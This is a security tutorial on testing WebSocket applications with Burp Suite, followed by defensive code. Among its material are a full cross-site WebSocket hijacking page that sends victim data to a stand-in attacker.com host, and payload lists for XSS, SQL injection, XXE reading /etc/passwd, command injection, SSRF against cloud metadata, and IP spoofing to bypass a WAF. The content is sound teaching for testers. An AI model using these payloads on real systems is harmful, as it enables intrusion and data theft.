# Testing for WebSocket Security Vulnerabilities

WebSocket security testing requires a fundamentally different mindset from testing regular HTTP endpoints — because WebSocket connections are persistent, bidirectional, and transmit messages outside the normal HTTP request-response cycle, the attack surface spans not only every individual message payload but also the initial HTTP handshake that establishes the connection, the session context that persists across all subsequent messages, and the cross-origin trust decisions the server makes when accepting connections from other domains. Practically every vulnerability class that exists in HTTP-based applications — XSS, SQL injection, XML injection, CSRF, authorisation bypasses, and blind injection vulnerabilities detectable only via out-of-band techniques — can equally arise in WebSocket communications, because the transport changes but the fundamental risk remains constant: user-supplied data reaching unsafe processing functions without adequate validation or sanitisation. The key distinction that makes WebSocket vulnerabilities particularly dangerous is that the Same-Origin Policy does not prevent cross-origin WebSocket connections, meaning that unlike cross-origin HTTP requests where response reading is restricted, an attacker page on a completely different domain can establish a full bidirectional WebSocket connection to a victim application using the victim's authenticated session cookies — enabling both action execution and data exfiltration in a single attack that surpasses standard CSRF in impact. 

The fundamental principle: **WebSocket security testing covers two distinct attack surfaces — message content (testing payloads inside messages) and the handshake itself (testing how the connection is established and authenticated) — and both must be assessed independently and thoroughly**.

## Manipulating WebSocket Traffic

### Intercepting and modifying messages

**Using Burp Suite Proxy for WebSocket interception:**

```
WebSocket traffic in Burp Suite:
WebSocket messages appear in a dedicated tab:
Proxy → WebSockets history

This separates them from HTTP traffic and shows:
→ Direction: Client-to-server or Server-to-client
→ Message content: raw or JSON payload
→ Timestamp: when message was sent/received
→ Connection: which WebSocket connection the message belongs to

To intercept messages in real time:
1. Open Burp's browser (or configure proxy in external browser)
2. Navigate to the application function using WebSockets
   (Live chat, real-time feeds, notifications, game state, etc.)
3. Proxy → Intercept → Intercept is ON
4. Interact with the application to trigger WebSocket messages
5. Message appears in Intercept tab — paused before forwarding
6. View, modify content, then click Forward to send it on

Configuring which direction to intercept:
Settings → Tools → Proxy → WebSocket interception rules
→ Can configure: intercept client-to-server messages
→ Can configure: intercept server-to-client messages
→ Can configure: intercept both, or neither
→ Selective interception reduces noise during testing
```

**Identifying WebSocket usage in a target application:**

```
Signs an application uses WebSockets:
1. Live updates without page reload (chat, dashboards, feeds)
2. Real-time multiplayer or collaborative features
3. Burp Proxy: entries appearing in WebSockets history tab
4. Browser DevTools: Network tab → WS filter shows connections

In Browser DevTools (Chrome/Firefox):
Developer Tools → Network → WS (filter)
→ Shows all WebSocket connections
→ Click connection → Messages tab
→ Shows all messages in both directions with timestamps
→ Arrows: ↑ client-to-server, ↓ server-to-client

In Burp Suite:
Proxy → WebSockets history
→ Lists every message exchanged over WebSocket connections
→ Colour-coded by direction
→ Right-click any message → Send to Repeater for further testing
```

### Replaying and generating new messages

**Using Burp Repeater for WebSocket message manipulation:**

```
Workflow — from Proxy to Repeater:
1. Identify a message in WebSockets history tab
   OR intercept a message in real time
2. Right-click the message → "Send to Repeater"
3. Burp Repeater opens with:
   → The WebSocket connection maintained (if still open)
   → The selected message loaded in the editor
   → History panel showing all messages on that connection

In Burp Repeater:
→ Edit message content directly in the editor
→ Click Send to transmit the modified message
→ Response (if any) from server appears in response panel
→ Repeater History panel shows all sent/received messages

Sending messages in either direction:
→ Default: send message from client to server
→ Can also craft server-to-client messages for testing
→ Useful for testing how the client handles malformed server data
→ Tests client-side processing vulnerabilities

Re-testing message variations:
→ History panel shows all messages on the connection
→ Right-click any → "Edit and Resend"
→ Modify one field at a time to isolate behaviour changes
→ Test multiple payloads without re-establishing connection each time
```

**Message manipulation workflow for injection testing:**

```
Step 1: Capture baseline message
Original: {"message":"Hello World","room":"general"}

Step 2: Identify all fields as potential injection points
→ "message" value: user-controlled, likely displayed to others
→ "room" value: may be used in backend queries

Step 3: Test each field with appropriate payloads

Field: "message" → Test for XSS
{"message":"<script>alert(1)</script>","room":"general"}
{"message":"<img src=1 onerror=alert(document.domain)>","room":"general"}

Field: "message" → Test for SQL injection
{"message":"' OR '1'='1","room":"general"}
{"message":"'; DROP TABLE messages;--","room":"general"}

Field: "room" → Test for injection in backend query
{"message":"Hello","room":"general' AND 1=1--"}
{"message":"Hello","room":"'; SELECT username,password FROM users--"}

Step 4: Observe responses and application behaviour
→ XSS: Does payload appear unescaped in another user's browser?
→ SQLi: Different responses for TRUE/FALSE conditions?
→ Error messages revealing database structure?
→ Out-of-band signals (DNS/HTTP requests to collaborator)?
```

### Manipulating WebSocket connections

**When handshake manipulation is necessary:**

```
Scenarios requiring handshake manipulation:

1. Reaching more attack surface:
   Default handshake may limit what endpoints/features are accessible
   Modifying upgrade request headers can unlock:
   → Different WebSocket subprotocols
   → Admin or privileged channels
   → Internal service endpoints not exposed via standard UI

2. Connection dropped by payload detection:
   WAF or application detects attack payload
   Blacklists attacker's IP or session
   Must establish new connection to continue testing
   → Reconnect with fresh/spoofed identifiers

3. Stale tokens in handshake:
   WebSocket connections sometimes include tokens in the upgrade URL:
   wss://example.com/ws?token=NONCE123
   After time, token expires
   Must obtain fresh token and reconnect with updated handshake

4. Testing header-based logic:
   Application makes decisions based on:
   X-Forwarded-For, User-Agent, Origin, custom headers
   Must modify handshake to inject test values
```

**Handshake manipulation in Burp Repeater:**

```
Method:
1. Send WebSocket message to Repeater (as described above)
2. In Repeater: click pencil icon (✏️) next to the WebSocket URL

Wizard options:
   ┌────────────────────────────────────────────┐
   │  WebSocket Connection Options              │
   │                                            │
   │  ○ Attach to existing connected WebSocket  │
   │  ○ Clone a connected WebSocket             │
   │  ○ Reconnect to a disconnected WebSocket   │
   └────────────────────────────────────────────┘

"Clone a connected WebSocket":
→ Wizard shows FULL HTTP upgrade request
→ All headers editable before handshake is re-performed
→ Modify: Origin, Cookie, X-Forwarded-For, Sec-WebSocket-Protocol
→ Click Connect → Burp performs handshake with modified request
→ If successful: new connection available for message testing

"Reconnect to a disconnected WebSocket":
→ Same as Clone — shows upgrade request for editing
→ Useful when original connection timed out or was terminated
→ Token fields can be refreshed before reconnecting

After successful handshake:
→ New WebSocket connection shown in Repeater
→ Send new messages through the freshly established connection
→ Test payloads under the new handshake context
```

## WebSocket Vulnerability Classes

### Vulnerability 1: Cross-Site WebSocket Hijacking (CSWSH)

**The most WebSocket-specific and severe vulnerability:** 

```
Why CSWSH exists:
HTTP: Cross-origin JavaScript CANNOT read cross-origin responses (SOP enforced)
WebSockets: SOP does NOT apply to WebSocket connections!

A page at https://attacker.com CAN:
1. Open: new WebSocket('wss://victim-bank.com/ws')
2. Browser sends the upgrade request including:
   Cookie: session=VICTIM_SESSION_TOKEN   ← Real authenticated cookies!
   Origin: https://attacker.com           ← Reveals attacker origin
3. If server doesn't validate Origin: ACCEPTS connection
4. Attacker's JS has FULL bidirectional access to victim's session!

This is CSWSH: Cross-Site WebSocket Hijacking
CSRF: Write-only (send requests, cannot read responses)
CSWSH: Read+Write (send messages AND read all responses!)

Full attack capability:
→ Send messages impersonating victim: perform any authenticated action
→ Read server responses: steal any data the victim can access
→ Listen for incoming messages: intercept real-time data
→ Combined: a single attack achieves both action + exfiltration
```

**CSWSH attack — complete implementation:**

```html
<!-- Attacker's malicious page hosted on https://attacker.com -->
<!DOCTYPE html>
<html>
<head>
    <title>Free Prize Claim</title>
</head>
<body>
<script>
// Step 1: Open WebSocket to victim site (cookies automatically included!)
var ws = new WebSocket('wss://victim-website.com/chat');

ws.onopen = function() {
    console.log("Connected to victim's WebSocket with their session!");

    // Step 2: Request sensitive data — victim's actions
    ws.send(JSON.stringify({
        "action": "getHistory",
        "limit": 100
    }));

    // OR: Perform privileged actions
    ws.send(JSON.stringify({
        "action": "changeEmail",
        "email": "attacker@evil.com"
    }));

    // OR: Request authentication credentials
    ws.send("READY");  // Some apps send initial state on "READY"
};

ws.onmessage = function(event) {
    // Step 3: Receive victim's data — server sends authenticated responses!
    var data = event.data;

    // Exfiltrate to attacker's server:
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: data,
        mode: 'no-cors'
    });

    // Or via image tag (older exfiltration method):
    new Image().src = 'https://attacker.com/log?data=' + btoa(data);
};

ws.onclose = function(event) {
    // Reconnect if connection drops:
    setTimeout(reconnect, 2000);
};
</script>
<!-- Decoy content visible to victim: -->
<h1>Loading your prize...</h1>
</body>
</html>
```

**Testing for CSWSH — step by step:**

```
Step 1: Identify WebSocket handshake in Burp Proxy
Look in WebSockets history for the upgrade request:
GET /ws HTTP/1.1
Host: vulnerable-website.com
Upgrade: websocket
Connection: keep-alive, Upgrade
Sec-WebSocket-Key: nDaimG37x+Ul0x3E5DRNTQ==
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Origin: https://vulnerable-website.com

Step 2: Check if CSRF token is present in handshake
→ Is there a CSRF token in the URL? (wss://site.com/ws?token=...)
→ Is there a custom header with a nonce?
→ Are cookies the ONLY authentication? If yes → potentially CSWSH-vulnerable!

Step 3: Test Origin header validation
In Burp Repeater → Pencil icon → Clone WebSocket:
Modify the handshake:
GET /ws HTTP/1.1
Host: vulnerable-website.com
Origin: https://attacker.com              ← Changed to different origin!
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2

Click Connect:
→ Server returns 101 Switching Protocols?  → VULNERABLE (no Origin check!)
→ Server returns 403 Forbidden?            → Protected (Origin rejected)

Step 4: Test null Origin (some bypass techniques)
Origin: null
→ Some servers only check for the application's own origin and miss null

Step 5: If vulnerable — test data access
After establishing cross-origin connection:
Send initial messages to trigger data responses:
{"action": "getHistory"}
{"type": "requestProfile"}
→ Does server return sensitive authenticated data? → CSWSH confirmed!
```

**Why cookies-only authentication is the core issue:**

```
WebSocket handshake is an HTTP request:
Browsers AUTOMATICALLY send cookies for the target domain
No JavaScript required to include cookies
No user interaction required

Compare CSRF vs CSWSH:
CSRF:
→ Attacker forges HTTP request (GET/POST)
→ Browser sends cookies with it
→ Server performs action
→ Attacker CANNOT read the response (SOP blocks JS from reading cross-origin HTTP)
→ Write-only: actions performed but no data theft

CSWSH:
→ Attacker initiates WebSocket upgrade (HTTP request with cookies)
→ Browser sends cookies with upgrade request
→ Server accepts and switches to WebSocket protocol
→ Now: attacker's JavaScript has FULL access to the WebSocket!
→ SOP never applied: WebSocket connections aren't restricted by SOP
→ Read+Write: actions performed AND responses readable!

The key: once WebSocket is established, SOP is irrelevant
The attack is an HTTP-level vulnerability (missing CSRF protection on handshake)
that is amplified by WebSocket's bidirectional nature into full session hijacking
```

### Vulnerability 2: WebSocket XSS

**Injecting scripts via WebSocket message payloads:** 

```
Vulnerable scenario:
Chat application using WebSockets

Client sends:
{"message":"Hello Carlos"}

Server broadcasts to all users, client renders:
<td>Hello Carlos</td>

If no sanitisation before innerHTML:
document.querySelector('td').innerHTML = receivedMessage.content;
→ innerHTML interprets HTML → XSS!

Attack message:
{"message":"<img src=1 onerror='alert(1)'>"}

Server broadcasts payload to all connected users
Their browsers render it → XSS fires in every connected victim's browser!

Stored WebSocket XSS:
If messages are stored (chat history, notifications):
→ Payload persists and affects every user who later loads the history
→ Equivalent to stored XSS via WebSocket delivery
→ One injection → persistent XSS for all future visitors
```

**Testing WebSocket XSS systematically:**

```
Phase 1: Detect reflection
Send text string: {"message":"TESTXSS1234"}
Observe: Does "TESTXSS1234" appear verbatim in the page?
→ YES: Value is reflected into DOM — potential XSS

Phase 2: Test HTML interpretation
Send: {"message":"<b>bold test</b>"}
Observe: Does text appear bold in browser?
→ YES: HTML tags interpreted → innerHTML or equivalent used → XSS!
→ NO: Tags visible as plain text → textContent or encoding used → safer

Phase 3: Test script execution
Send: {"message":"<img src=1 onerror=alert(document.domain)>"}
Send: {"message":"<svg onload=alert(1)>"}
Observe: Alert box fires?
→ YES: XSS confirmed!
→ NO: Check if WAF/filter is active

Phase 4: Test WAF bypass (if initial payloads blocked)
Server-side blocking detection — error/disconnect on "onerror"?

Bypasses to test:
→ Case variation: oNeRrOr, OnErRoR
→ Alternative events: onmouseover, onclick, onfocus
→ Alternative tags: <svg onload=>, <details open ontoggle=>
→ HTML encoding: &#111;&#110;&#101;&#114;&#114;&#111;&#114;
→ Double encoding
→ Attribute without quotes: <img src=x onerror=alert`1`>
→ No-event-handler tags: <script>alert(1)</script>
   (depends on parsing context)
```

**Combining handshake manipulation with WAF bypass:** 

```
Scenario: Application blocks XSS attempts and bans IP via WebSocket messages
Detection: "onerror" in message → IP blacklisted → connection dropped

Attack chain:
Step 1: Modify WebSocket handshake before connecting
In Burp Repeater → Pencil → Clone WebSocket
Add/modify header in upgrade request:
X-Forwarded-For: 192.168.0.1    ← Spoofed IP address

(Server uses X-Forwarded-For to identify client IP for blacklisting)

Step 2: Send XSS payload with case variation to bypass filter
Original blocked:    "onerror"
Bypass:              "oNeRrOr"

Modified message:
{"message":"<img src=1 oNeRrOr=alert(1)>"}

Step 3: If blocked again:
Reconnect with different X-Forwarded-For value (fresh IP):
X-Forwarded-For: 10.0.0.1, 172.16.0.1

Step 4: Combine fresh IP + improved bypass
New IP = not yet blacklisted
New payload format = avoids string detection
→ XSS executes!

This demonstrates: misplaced trust in X-Forwarded-For header
Server trusts client-supplied IP header for security decisions
Attacker can trivially forge this value in the WebSocket handshake!
```

### Vulnerability 3: WebSocket Injection Attacks

**SQL injection, XML injection, and other server-side injections:** 

```
WebSocket messages reach backend processing just like HTTP parameters
Developers sometimes forget to apply the same server-side validation
to WebSocket message fields that they apply to HTTP request parameters

SQL injection via WebSocket:
Message: {"userId": "1", "action": "getOrders"}

If backend uses: SELECT * FROM orders WHERE userId = ' + msg.userId
Test: {"userId": "1' OR '1'='1", "action": "getOrders"}
→ Returns all orders? → SQLi confirmed!

Boolean-based blind via WebSocket:
True condition:  {"userId": "1' AND '1'='1", "action": "getOrders"}
→ Normal response

False condition: {"userId": "1' AND '1'='2", "action": "getOrders"}
→ Empty/different response → confirms blind SQLi!

Time-based blind:
{"userId": "1'; SELECT SLEEP(5);--", "action": "getOrders"}
→ 5-second delay in response? → SQLi confirmed (time-based blind)

XML injection via WebSocket:
If application processes XML payloads over WebSocket:
{"type":"xmlQuery","data":"<user><id>1</id></user>"}

Test XXE:
{"type":"xmlQuery","data":"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><user><id>&xxe;</id></user>"}
→ File contents in response? → XXE via WebSocket!
```

**Out-of-band (OAST) techniques for blind vulnerabilities:** 

```
Many WebSocket injection vulnerabilities produce no visible response
(Blind SQLi, blind command injection, blind XXE, SSRF)

OAST approach using Burp Collaborator:
1. Generate unique Burp Collaborator URL:
   abc123.oastify.com

2. Embed in WebSocket payload:
   SQL injection with DNS trigger:
   {"query": "1'; EXEC xp_dirtree '//abc123.oastify.com/test';--"}

   XXE with external entity:
   {"xml": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://abc123.oastify.com/xxe'>]><data>&xxe;</data>"}

   SSRF via WebSocket URL field:
   {"target": "http://abc123.oastify.com/ssrf-test"}

3. Check Collaborator for interactions:
   If DNS lookup or HTTP request arrives at abc123.oastify.com:
   → Confirms blind vulnerability without visible response!
   → Timing of interaction confirms code path reached
   → Can extract data using DNS exfiltration techniques

Why OAST is essential for WebSocket testing:
WebSocket responses may be compressed, cached, or processed asynchronously
Server might not return SQL/XXE results in the WebSocket message
OAST confirms execution even when no output channel exists
Identifies blind vulnerabilities that would be missed by response-inspection only
```

### Vulnerability 4: Handshake-Based Vulnerabilities

**Misplaced trust in HTTP headers during handshake:** 

```
The WebSocket handshake is a regular HTTP request
All HTTP headers present in the upgrade request are attacker-controllable

Common misplaced trust patterns:

1. X-Forwarded-For for IP-based access control:
Vulnerable server logic:
if (req.headers['x-forwarded-for'] in ADMIN_IPS) {
    // Grant admin WebSocket access
    upgradeToAdminWebSocket();
}

Attack:
Add to handshake: X-Forwarded-For: 10.0.0.1  (known admin IP)
→ Bypass IP-based access control!

2. User-Agent for device detection:
if (req.headers['user-agent'].includes('MobileApp/2.0')) {
    // Mobile app gets premium WebSocket endpoint
    upgradeToMobileWebSocket();
}

Attack:
Modify handshake User-Agent: User-Agent: MobileApp/2.0
→ Access mobile-specific WebSocket features!

3. Custom token headers without proper validation:
X-Internal-Token: STATIC_HARDCODED_VALUE
→ Find token in JavaScript source → replay in handshake

4. Referrer-based trust:
if (req.headers['referer'].includes('trusted-site.com')) {
    // Trust because request came "from" trusted site
}
→ Referer header is controllable — forge it in handshake!
```

**Session handling flaws in WebSocket context:** 

```
WebSocket session context = session established at handshake

The session_id cookie (or token) supplied during handshake
defines WHO all subsequent messages are attributed to

Vulnerability: Session fixation via WebSocket
If attacker can control session cookie in handshake:
→ Force victim to use attacker-known session
→ Connect attacker's WebSocket with that same session
→ Monitor all messages in the "shared" session

Vulnerability: Concurrent session exploitation
WebSocket connections may run in separate session contexts
→ Connect with one session for reading
→ Trigger actions in another session via HTTP
→ Cross-contaminate if server doesn't isolate WebSocket contexts

Vulnerability: Privilege persistence
Privilege level checked at handshake time only
→ User authenticated as admin, starts WebSocket
→ Admin privilege revoked server-side
→ Existing WebSocket: still operates with admin session context
→ Revocation doesn't terminate existing connections!
→ Continue sending privileged messages until disconnect!

Testing:
1. Establish WebSocket as low-privilege user
2. Attempt privileged actions via WebSocket messages
3. Compare responses to HTTP API equivalents
4. Test if privilege changes are reflected on existing connections
```

**Custom HTTP headers as attack surface in handshake:**

```
Applications sometimes use custom headers in WebSocket handshake
These create unique attack surface not present in the UI

Common custom headers to test:
X-API-Version: 2          → Try: 1, 3, beta, internal
X-Feature-Flag: false     → Try: true, 1, enabled
X-Debug-Mode: 0           → Try: 1, true (may enable verbose errors!)
X-User-Role: user         → Try: admin, superuser, system
X-Client-Type: web        → Try: mobile, desktop, internal
X-Bypass-WAF: false       → Try: true (some WAFs have test modes!)

Testing workflow:
1. Find custom headers in WebSocket handshake via Proxy capture
2. Note values in normal authenticated handshake
3. In Repeater: clone connection, modify custom header values
4. Reconnect and test if behaviour changes

Debug mode example:
Normal: X-Debug: false → Generic error responses
Attack: X-Debug: true  → Full stack traces with path, SQL, env vars
→ Information disclosure leading to further exploitation!
```

### Vulnerability 5: WebSocket Denial of Service

**Connection and resource exhaustion:** 

```
WebSocket connections are persistent — each consumes:
→ Memory allocation on server
→ File descriptor / socket handle
→ Thread or event loop slot
→ Any cached state for the connection

DoS attack vectors:
1. Connection exhaustion:
   Open thousands of WebSocket connections simultaneously
   Each consumes server resources
   Server runs out of file descriptors or memory
   → Legitimate users cannot connect

2. Message flooding:
   Establish authenticated connection
   Send thousands of messages per second
   If server processes synchronously: queue overwhelms server
   If message triggers heavy computation: amplified resource use

3. Slow connection / slow message:
   Open connection, send partial upgrade (hold it open)
   Never complete handshake → ties up connection slot
   Similar to Slowloris for HTTP

4. Large payload attack:
   Send WebSocket messages of maximum allowed size
   If server stores or processes without size limits:
   → Memory exhaustion per message
   → Database storage exhaustion if stored

Rate limiting for WebSockets should be applied at:
→ Connection rate (max new connections per IP per second)
→ Max concurrent connections per IP
→ Message rate per connection (messages per second)
→ Max message payload size
```

## Complete Testing Methodology

### Structured WebSocket security assessment

**Phase 1: Discovery and mapping**

```
1. Identify all WebSocket endpoints:
   → Burp Suite: WebSockets history tab
   → Browser DevTools: Network → WS filter
   → JavaScript source: search for new WebSocket(
   → Common endpoints: /ws, /socket, /chat, /events, /live, /stream

2. Document each endpoint:
   → URL and any URL parameters (tokens, room IDs)
   → Authentication method (cookies? URL token? both?)
   → Message format (JSON, XML, binary, plain text)
   → Direction: bidirectional? server-push only?
   → Purpose: what application function does it serve?

3. Map all message types:
   → Send various interactions and capture messages
   → Identify message fields (type, action, data, userId, etc.)
   → Note server-to-client message types (what data is pushed?)
   → Identify which fields are user-controllable vs. server-assigned
```

**Phase 2: Authentication and authorisation testing**

```
Test 1: Unauthenticated connection
→ Log out (clear cookies/tokens)
→ Attempt to connect to WebSocket endpoint
→ Does server accept connection? → Missing authentication!
→ Does server return data? → Missing authorisation!

Test 2: CSWSH (Origin validation)
→ Modify Origin header in handshake to: https://attacker.com
→ Does server accept connection? → CSWSH vulnerable!
→ Also test: Origin: null

Test 3: CSRF token absence
→ Is there any CSRF token in the WebSocket handshake?
→ Cookie-only auth + no CSRF token = CSWSH vulnerable

Test 4: Horizontal privilege (accessing other users' data)
→ Connect as user A, note user ID in messages
→ Modify userId in messages to user B's ID
→ Does server return user B's data? → IDOR via WebSocket!

Test 5: Vertical privilege (accessing admin functions)
→ Connect as normal user
→ Send admin-level action messages:
   {"action": "deleteUser", "userId": "victim"}
   {"action": "getAdminPanel"}
→ Does server execute privileged actions? → Auth bypass!
```

**Phase 3: Message injection testing**

```
For each user-controllable field in WebSocket messages:

XSS:
<script>alert(1)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
javascript:alert(1)

SQL injection:
'
' OR '1'='1
1; DROP TABLE users--
' UNION SELECT null,username,password FROM users--
'; SELECT SLEEP(5);--

XML/XXE injection:
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR_URL/">]><data>&xxe;</data>

Command injection (if server executes system commands):
; ls -la
| cat /etc/passwd
`id`
$(whoami)

SSRF:
{"url":"http://169.254.169.254/latest/meta-data/"}  (AWS metadata)
{"target":"http://internal-service.local/admin"}

Path traversal:
{"file":"../../../etc/passwd"}
{"path":"....//....//etc/passwd"}

Template injection:
{{7*7}}
${7*7}
<%= 7*7 %>
```

**Phase 4: OAST/Blind detection**

```
For fields not showing output directly:

Generate Burp Collaborator URL: RANDOM.oastify.com

DNS exfiltration (SQLi blind):
{"query":"1'; EXEC master..xp_dirtree '//RANDOM.oastify.com/a';--"}
{"id":"1 AND LOAD_FILE('//RANDOM.oastify.com/x')"}

HTTP exfiltration (XXE):
{"xml":"<!DOCTYPE x [<!ENTITY oob SYSTEM 'http://RANDOM.oastify.com/xxe'>]><x>&oob;</x>"}

SSRF detection:
{"webhook":"http://RANDOM.oastify.com/ssrf"}
{"imageUrl":"http://RANDOM.oastify.com/img.jpg"}

Data exfiltration via DNS (if blind SQLi confirmed):
Extract username char by char via DNS hostname:
{"id":"1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'"}
+ DNS interaction timing reveals data
```

## Securing WebSocket Implementations

### Server-side defences

**Defence 1: Validate Origin header (prevent CSWSH)** 

```javascript
// Node.js WebSocket server — Origin validation:
const WebSocket = require('ws');

const ALLOWED_ORIGINS = new Set([
    'https://app.example.com',
    'https://www.example.com'
]);

const wss = new WebSocket.Server({
    port: 8080,
    verifyClient: function(info, callback) {
        const origin = info.req.headers.origin;

        if (!origin || !ALLOWED_ORIGINS.has(origin)) {
            console.warn('Rejected WebSocket from origin:', origin);
            callback(false, 403, 'Forbidden: Invalid origin');
            return;
        }

        callback(true);
    }
});

wss.on('connection', function(ws, req) {
    // Origin validated — connection accepted
    handleConnection(ws, req);
});
```

```python
# Python websockets library — Origin validation:
import websockets
import asyncio

ALLOWED_ORIGINS = {'https://app.example.com', 'https://www.example.com'}

async def handler(websocket, path):
    origin = websocket.request_headers.get('Origin', '')

    if origin not in ALLOWED_ORIGINS:
        await websocket.close(1008, 'Invalid origin')
        return

    await process_connection(websocket, path)

start_server = websockets.serve(handler, 'localhost', 8765)
```

**Defence 2: Add CSRF token to WebSocket handshake (prevent CSWSH)** 

```javascript
// Server: generate CSRF token for WebSocket handshake
app.get('/page-with-websocket', (req, res) => {
    const wsToken = crypto.randomBytes(32).toString('hex');
    req.session.wsToken = wsToken;  // Store in session
    res.render('chat', { wsToken });
});

// Client-side: include token in WebSocket URL
const wsToken = document.getElementById('ws-token').dataset.token;
const ws = new WebSocket(`wss://example.com/ws?token=${wsToken}`);

// Server: validate token during WebSocket upgrade
const wss = new WebSocket.Server({
    verifyClient: function(info, callback) {
        const url = new URL(info.req.url, 'http://localhost');
        const token = url.searchParams.get('token');
        const sessionToken = getSessionWsToken(info.req);

        if (!token || token !== sessionToken) {
            callback(false, 403, 'Invalid CSRF token');
            return;
        }
        callback(true);
    }
});

// Why this prevents CSWSH:
// Attacker can trigger cross-origin WebSocket connection
// Cookies are included automatically (that's the attack!)
// But: attacker CANNOT read the CSRF token from the victim's page (SOP blocks reading)
// Without the valid token: server rejects the upgrade!
```

**Defence 3: Validate and sanitise every message** 

```javascript
// Server-side message handler — treat all content as untrusted:
wss.on('connection', function(ws, req) {
    // Identity comes from SESSION (established at handshake), not message!
    const userId = req.session.userId;
    const userRole = req.session.role;

    ws.on('message', function(data) {
        let message;

        // Validate JSON structure:
        try {
            message = JSON.parse(data);
        } catch {
            ws.send(JSON.stringify({ error: 'Invalid message format' }));
            return;
        }

        // Validate message type from allowlist:
        const ALLOWED_ACTIONS = ['sendMessage', 'joinRoom', 'leaveRoom'];
        if (!ALLOWED_ACTIONS.includes(message.action)) {
            ws.send(JSON.stringify({ error: 'Unknown action' }));
            return;
        }

        // Validate field types and lengths:
        if (typeof message.content !== 'string' ||
            message.content.length > 500) {
            ws.send(JSON.stringify({ error: 'Invalid content' }));
            return;
        }

        // NEVER use userId from message — use session!
        // ✗ WRONG: const userId = message.userId;
        // ✓ RIGHT: const userId = req.session.userId; (set above)

        // Sanitise content for storage and display:
        const sanitisedContent = sanitiseForStorage(message.content);

        // Use parameterised queries for any DB operations:
        db.query(
            'INSERT INTO messages (userId, content, room) VALUES (?, ?, ?)',
            [userId, sanitisedContent, message.room],
            handleResult
        );
    });
});
```

**Defence 4: Client-side — sanitise messages before rendering**

```javascript
// Client receives WebSocket message — NEVER trust content!
ws.onmessage = function(event) {
    const data = JSON.parse(event.data);

    // ✗ DANGEROUS — renders HTML from server as HTML:
    messageContainer.innerHTML += '<td>' + data.content + '</td>';

    // ✓ SAFE — creates elements and uses textContent:
    const cell = document.createElement('td');
    cell.textContent = data.content;  // Never interpreted as HTML!
    messageContainer.appendChild(cell);

    // If HTML is required (rich text):
    // Use DOMPurify to sanitise before innerHTML:
    const cell = document.createElement('td');
    cell.innerHTML = DOMPurify.sanitize(data.content, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
        ALLOWED_ATTR: []
    });
    messageContainer.appendChild(cell);
};
```

**Defence 5: Never use attacker-controllable data in WebSocket URL**

```javascript
// ✗ VULNERABLE: WebSocket URL built from URL parameter
const wsEndpoint = new URLSearchParams(location.search).get('server');
const ws = new WebSocket(wsEndpoint);
// Attack: ?server=wss://attacker.com/malicious
// → All messages go to attacker's server!
// → Attacker injects malicious server responses

// ✗ VULNERABLE: WebSocket URL from URL fragment
const ws = new WebSocket('wss://example.com' + location.hash.slice(1));
// Attack: #/ws/../../../attacker.com/ws
// → Path traversal in WebSocket URL

// ✓ SAFE: Hard-coded WebSocket URL
const ws = new WebSocket('wss://app.example.com/ws');
// No user-controllable component in URL

// ✓ SAFE: Hard-coded base + validated path from allowlist
const ALLOWED_ROOMS = { 'general': '/ws/general', 'support': '/ws/support' };
const roomParam = new URLSearchParams(location.search).get('room');
const wsPath = ALLOWED_ROOMS[roomParam] || '/ws/general';
const ws = new WebSocket('wss://app.example.com' + wsPath);
// Allowlist prevents injection — only known paths permitted
```
